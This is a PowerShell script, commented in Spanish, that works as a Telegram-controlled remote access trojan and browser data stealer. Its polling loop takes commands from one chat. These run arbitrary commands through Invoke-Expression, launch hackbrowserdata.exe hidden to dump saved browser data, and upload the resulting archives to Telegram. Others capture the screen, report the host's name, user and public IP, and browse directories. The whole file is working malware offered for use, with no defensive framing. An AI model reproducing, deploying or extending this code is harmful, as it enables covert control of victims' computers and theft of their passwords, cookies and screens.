param(
    [Parameter(Mandatory=$true)]
    [string]$Token,
    
    [Parameter(Mandatory=$true)] 
    [string]$ChatId
)

# === PREVENIR MULTIPLES INSTANCIAS ===
$mutexName = "Global\TelegramBot_$($Token.Substring(0,10))"
$mutex = New-Object System.Threading.Mutex($false, $mutexName)
if (-not $mutex.WaitOne(0, $false)) {
    Write-Host "[!] Bot ya esta corriendo. Saliendo..."
    exit 1
}

# Liberar mutex al salir
trap {
    $mutex.ReleaseMutex()
    $mutex.Dispose()
    exit 1
}

$ErrorActionPreference = 'Continue'
$ApiUrl = "https://api.telegram.org/bot$Token"
$LogFile = Join-Path $env:APPDATA 'CarpetaDos\bot.log'
$HackPath = Join-Path $env:APPDATA 'CarpetaDos\hackbrowserdata.exe'

New-Item -ItemType Directory -Path (Split-Path $LogFile) -Force -ErrorAction SilentlyContinue | Out-Null

function Write-Log {
    param([string]$Message)
    $line = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $Message"
    Add-Content -Path $LogFile -Value $line -ErrorAction SilentlyContinue
    Write-Host $line
}

# Desactivar webhook y limpiar updates pendientes
try {
    Invoke-RestMethod -Uri "$ApiUrl/deleteWebhook?drop_pending_updates=true" -Method Post -ErrorAction Stop | Out-Null
    Write-Log "Webhook desactivado"
    Start-Sleep -Seconds 3
    
    # Limpiar updates pendientes
    $updates = Invoke-RestMethod -Uri "$ApiUrl/getUpdates?offset=-1" -Method Get
    if ($updates.result.Count -gt 0) {
        $lastId = ($updates.result | Select-Object -Last 1).update_id
        Invoke-RestMethod -Uri "$ApiUrl/getUpdates?offset=$($lastId + 1)" -Method Get | Out-Null
    }
} catch {
    Write-Log "Error limpiando webhook: $($_.Exception.Message)"
}

Add-Type -AssemblyName System.Windows.Forms, System.Drawing

function Send-Message {
    param([string]$Text, [string]$TargetChatId = $ChatId)
    try {
        if ($Text.Length -gt 4000) { $Text = $Text.Substring(0, 4000) + "`n...(truncado)" }
        
        $body = @{
            chat_id = $TargetChatId
            text = $Text
        } | ConvertTo-Json -Compress
        
        $response = Invoke-RestMethod -Uri "$ApiUrl/sendMessage" -Method Post -ContentType "application/json" -Body $body
        
        return $true
    } catch {
        Write-Log "Error Send-Message: $($_.Exception.Message)"
        return $false
    }
}

function Send-File {
    param(
        [string]$Path, 
        [string]$Caption="", 
        [string]$TargetChatId = $ChatId
    )
    
    try {
        if (-not (Test-Path $Path)) {
            Write-Log "Archivo no existe: $Path"
            return $false
        }
        
        $fileInfo = Get-Item $Path
        if ($fileInfo.Length -gt 49MB) {
            Write-Log "Archivo muy grande: $($fileInfo.Length)"
            Send-Message -Text "Archivo muy grande: $($fileInfo.Name)" -TargetChatId $TargetChatId
            return $false
        }
        
        # Usar boundary unico
        $boundary = [System.Guid]::NewGuid().ToString()
        $contentType = "multipart/form-data; boundary=$boundary"
        
        $sb = New-Object System.Text.StringBuilder
        
        # chat_id
        [void]$sb.AppendLine("--$boundary")
        [void]$sb.AppendLine("Content-Disposition: form-data; name=`"chat_id`"")
        [void]$sb.AppendLine()
        [void]$sb.AppendLine($TargetChatId)
        
        # caption (si existe)
        if ($Caption) {
            [void]$sb.AppendLine("--$boundary")
            [void]$sb.AppendLine("Content-Disposition: form-data; name=`"caption`"")
            [void]$sb.AppendLine()
            [void]$sb.AppendLine($Caption)
        }
        
        # archivo
        [void]$sb.AppendLine("--$boundary")
        [void]$sb.AppendLine("Content-Disposition: form-data; name=`"document`"; filename=`"$($fileInfo.Name)`"")
        [void]$sb.AppendLine("Content-Type: application/octet-stream")
        [void]$sb.AppendLine()
        
        $headerBytes = [System.Text.Encoding]::UTF8.GetBytes($sb.ToString())
        $fileBytes = [System.IO.File]::ReadAllBytes($Path)
        $footerBytes = [System.Text.Encoding]::UTF8.GetBytes("`r`n--$boundary--`r`n")
        
        $totalBytes = New-Object byte[] ($headerBytes.Length + $fileBytes.Length + $footerBytes.Length)
        [System.Buffer]::BlockCopy($headerBytes, 0, $totalBytes, 0, $headerBytes.Length)
        [System.Buffer]::BlockCopy($fileBytes, 0, $totalBytes, $headerBytes.Length, $fileBytes.Length)
        [System.Buffer]::BlockCopy($footerBytes, 0, $totalBytes, ($headerBytes.Length + $fileBytes.Length), $footerBytes.Length)
        
        $response = Invoke-RestMethod -Uri "$ApiUrl/sendDocument" -Method Post -ContentType $contentType -Body $totalBytes
        
        Write-Log "Archivo enviado OK: $($fileInfo.Name)"
        return $true
        
    } catch {
        Write-Log "Error Send-File: $($_.Exception.Message)"
        return $false
    }
}

function Get-Info {
    try {
        $ip = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip
    } catch { $ip = "Desconocida" }
    
    $os = (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
    if (-not $os) { $os = "Windows" }
    
    return "PC: $env:COMPUTERNAME | User: $env:USERNAME | IP: $ip | OS: $os"
}

function Take-Screenshot {
    $path = $null
    try {
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
        
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $bitmap = $null
        $graphics = $null
        
        try {
            $bitmap = New-Object System.Drawing.Bitmap($screen.Bounds.Width, $screen.Bounds.Height)
            $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
            $graphics.CopyFromScreen(
                $screen.Bounds.Location, 
                [System.Drawing.Point]::Empty, 
                $screen.Bounds.Size
            )
            
            $path = Join-Path $env:TEMP "screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
            
            # Asegurar que el directorio existe
            $dir = Split-Path $path -Parent
            if (-not (Test-Path $dir)) {
                New-Item -ItemType Directory -Path $dir -Force | Out-Null
            }
            
            $bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
            
            $result = Send-File -Path $path -Caption "Screenshot $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
            return $result
            
        } finally {
            if ($graphics) { $graphics.Dispose() }
            if ($bitmap) { $bitmap.Dispose() }
            if ($path -and (Test-Path $path)) {
                Remove-Item $path -Force -ErrorAction SilentlyContinue
            }
        }
        
    } catch {
        Write-Log "Error screenshot: $($_.Exception.Message)"
        Send-Message -Text "Error capturando: $($_.Exception.Message)"
        return $false
    }
}

function Run-Steal {
    param([string]$TargetChatId = $ChatId)
    
    Send-Message -Text "Extrayendo datos..." -TargetChatId $TargetChatId
    Write-Log "Iniciando extraccion de navegadores"
    
    if (-not (Test-Path $HackPath)) {
        Send-Message -Text "Error: hackbrowserdata.exe no encontrado" -TargetChatId $TargetChatId
        return
    }
    
    $outputDir = Join-Path $env:TEMP "browser_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
    New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
    
    try {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $HackPath
        $psi.Arguments = "dump -d `"$outputDir`" -f json"
        $psi.CreateNoWindow = $true
        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $psi.UseShellExecute = $false
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError = $true
        
        $proc = [System.Diagnostics.Process]::Start($psi)
        
        # Esperar con timeout de 3 minutos
        if (-not $proc.WaitForExit(180000)) {
            $proc.Kill()
            Write-Log "Timeout - matando proceso hackbrowserdata"
            Send-Message -Text "Timeout en extraccion" -TargetChatId $TargetChatId
            Remove-Item $outputDir -Recurse -Force -ErrorAction SilentlyContinue
            return
        }
        
        $stdout = $proc.StandardOutput.ReadToEnd()
        $stderr = $proc.StandardError.ReadToEnd()
        
        Write-Log "Exit code: $($proc.ExitCode)"
        if ($stdout) { Write-Log "Stdout: $stdout" }
        if ($stderr) { Write-Log "Stderr: $stderr" }
        
        # Buscar JSONs
        $jsonFiles = Get-ChildItem -Path $outputDir -Filter "*.json" -Recurse -ErrorAction SilentlyContinue
        
        if (-not $jsonFiles) {
            Send-Message -Text "No se generaron archivos JSON" -TargetChatId $TargetChatId
            Remove-Item $outputDir -Recurse -Force -ErrorAction SilentlyContinue
            return
        }
        
        Write-Log "Encontrados $($jsonFiles.Count) archivos JSON"
        $sent = 0
        
        foreach ($json in $jsonFiles) {
            try {
                # Comprimir individualmente
                $zipPath = Join-Path $env:TEMP "$($json.BaseName).zip"
                
                if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
                
                Compress-Archive -Path $json.FullName -DestinationPath $zipPath -Force -CompressionLevel Optimal
                
                # Renombrar caption (quitar .json)
                $caption = $json.BaseName
                
                if (Send-File -Path $zipPath -Caption $caption -TargetChatId $TargetChatId) {
                    $sent++
                }
                
                Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                Start-Sleep -Milliseconds 1000  # Evitar rate limit
                
            } catch {
                Write-Log "Error procesando $($json.Name): $($_.Exception.Message)"
            }
        }
        
        Send-Message -Text "Extraccion completada. Enviados: $sent de $($jsonFiles.Count)" -TargetChatId $TargetChatId
        Remove-Item $outputDir -Recurse -Force -ErrorAction SilentlyContinue
        
    } catch {
        Write-Log "Error Run-Steal: $($_.Exception.Message)"
        Send-Message -Text "Error: $($_.Exception.Message)" -TargetChatId $TargetChatId
    }
}

function Execute-Cmd {
    param([string]$Command, [string]$TargetChatId = $ChatId)
    
    Write-Log "Ejecutando: $Command"
    
    try {
        $output = Invoke-Expression $Command 2>&1 | Out-String
        
        if ([string]::IsNullOrWhiteSpace($output)) {
            $output = "(comando ejecutado sin salida)"
        }
        
        # Guardar en archivo temporal
        $tempFile = Join-Path $env:TEMP "cmd_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
        $content = "Comando: $Command`nFecha: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n$('='*50)`n`n$output"
        [System.IO.File]::WriteAllText($tempFile, $content, [System.Text.Encoding]::UTF8)
        
        # Enviar como archivo
        if (Send-File -Path $tempFile -Caption "Resultado de: $Command" -TargetChatId $TargetChatId) {
            $lines = $output -split "`n" | Where-Object { $_.Trim() } | Select-Object -First 3
            $preview = ($lines -join "`n")
            if ($preview.Length -gt 100) { $preview = $preview.Substring(0, 100) + "..." }
            Send-Message -Text "Comando ejecutado. Archivo enviado.`nPreview:`n$preview" -TargetChatId $TargetChatId
        }
        
        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        
    } catch {
        Send-Message -Text "Error ejecutando comando: $($_.Exception.Message)" -TargetChatId $TargetChatId
    }
}

function Process-Command {
    param([string]$Text, [string]$FromChatId)
    
    Write-Log "Procesando: '$Text'"
    $cmd = $Text.Trim()
    $cmdLower = $cmd.ToLower()
    
    # Separar comando y argumentos
    if ($cmdLower -match '^(/?[a-z]+)\s*(.*)') {
        $baseCmd = $Matches[1]
        $args = $Matches[2].Trim()
    } else {
        return
    }
    
    switch ($baseCmd) {
        { $_ -in 'ls', '/ls' } {
            try {
                $items = Get-ChildItem | Select-Object Mode, LastWriteTime, Length, Name | Format-Table -AutoSize | Out-String
                Send-Message -Text "Directorio: $(Get-Location)`n`n$items"
            } catch {
                Send-Message -Text "Error: $($_.Exception.Message)"
            }
        }
        
        { $_ -in 'cmd', '/cmd' } {
            if ($args) {
                Execute-Cmd -Command $args
            } else {
                Send-Message -Text "Uso: /cmd <comando>"
            }
        }
        
        { $_ -in 'cd', '/cd' } {
            if ($args) {
                try {
                    Set-Location $args -ErrorAction Stop
                    Send-Message -Text "Ahora en: $(Get-Location)"
                } catch {
                    Send-Message -Text "Error: No se pudo ir a '$args'"
                }
            } else {
                Send-Message -Text "Uso: /cd <ruta>"
            }
        }
        
        { $_ -in 'pwd', '/pwd' } {
            Send-Message -Text "Directorio: $(Get-Location)"
        }
        
        { $_ -in 'steal', '/steal' } {
            Run-Steal
        }
        
        { $_ -in 'captura', '/captura' } {
            Send-Message -Text "Capturando..."
            if (-not (Take-Screenshot)) {
                Send-Message -Text "Error al capturar pantalla"
            }
        }
        
        { $_ -in 'info', '/info' } {
            Send-Message -Text (Get-Info)
        }
        
        { $_ -in 'help', '/help' } {
            Send-Message -Text @'
Comandos:
/ls - Listar archivos
/cmd <comando> - Ejecutar (resultado en .txt)
/cd <ruta> - Cambiar directorio
/pwd - Directorio actual
/steal - Extraer datos navegadores
/captura - Screenshot
/info - Info del sistema
/help - Esta ayuda
'@
        }
        
        default {
            Write-Log "Comando desconocido: $baseCmd"
        }
    }
}

# Inicio
Write-Log "=== BOT INICIADO ==="
Write-Log "ChatId: $ChatId"

Send-Message -Text "Bot online - $(Get-Info)"

$lastUpdateId = 0
$consecutiveErrors = 0
$maxConsecutiveErrors = 10

while ($true) {
    try {
        $url = "$ApiUrl/getUpdates?offset=$($lastUpdateId + 1)&limit=10"
        $response = Invoke-RestMethod -Uri $url -TimeoutSec 60
        
        $consecutiveErrors = 0
        
        if ($response.ok -and $response.result.Count -gt 0) {
            foreach ($update in $response.result) {
                $lastUpdateId = $update.update_id
                $message = $update.message
                
                if ($null -eq $message -or [string]::IsNullOrEmpty($message.text)) { continue }
                
                $msgChatId = [string]$message.chat.id
                
                if ($msgChatId -eq $ChatId) {
                    Process-Command -Text $message.text -FromChatId $msgChatId
                } else {
                    Write-Log "Mensaje de otro chat: $msgChatId (esperado: $ChatId)"
                }
            }
        }
    } catch {
        $err = $_.Exception.Message
        $consecutiveErrors++
        
        if ($err -like "*409*") {
            Write-Log "Error 409 (Conflicto) - Limpiando updates..."
            try {
                Invoke-RestMethod -Uri "$ApiUrl/getUpdates?offset=-1" -TimeoutSec 10 | Out-Null
                Start-Sleep -Seconds 5
            } catch {}
        } elseif ($consecutiveErrors -ge $maxConsecutiveErrors) {
            Write-Log "Demasiados errores. Esperando 30s..."
            Start-Sleep -Seconds 30
            $consecutiveErrors = 0
        } else {
            Write-Log "Error bucle: $err"
        }
        
        Start-Sleep -Seconds 3
    }
    
    Start-Sleep -Milliseconds 800
}
